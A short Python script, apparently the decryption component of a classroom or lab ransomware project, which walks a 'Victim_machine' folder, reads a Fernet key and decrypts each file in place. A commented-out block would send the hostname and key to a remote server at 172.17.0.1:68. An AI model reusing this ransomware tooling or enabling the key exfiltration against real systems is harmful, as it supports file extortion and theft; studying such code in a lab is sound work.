#!/usr/bin/env python3
import socket
import os
from cryptography.fernet import Fernet

#finding all the files in current directory
files = []

for root, dirs, file in os.walk('/media/sf_Ransomware_Group8/Action/Victim_machine/Imp/'):
	print(file)
	print(dirs)
	print(root)
	for filename in file:
		if filename == "defender.py" or filename == "symkey.key" or filename == "wannasmile.py":
			continue
		filepath = os.path.join(root, filename)
		files.append(filepath)

print(files)

#Socket information
IP_ADDRESS = '172.17.0.1'
PORT = 68
hostname = socket.gethostname()


with open("/media/sf_Ransomware_Group8/Action/Victim_machine/Imp/symkey.key", "rb") as thekey:
	secret_key= thekey.read()
print(secret_key)

#Connect to server to transfer key and hostname
#with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#	s.connect((IP_ADDRESS, PORT))
#	print('Successfully connected...transmitting hostname and key')
#	s.send(f'{hostname} : {key}'.encode('utf-8'))
#	print('Finished transmitting data!!!')
#	s.close()

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_decrypted = Fernet(secret_key).decrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_decrypted)

print("All of your files have been decrypted successfully!!")
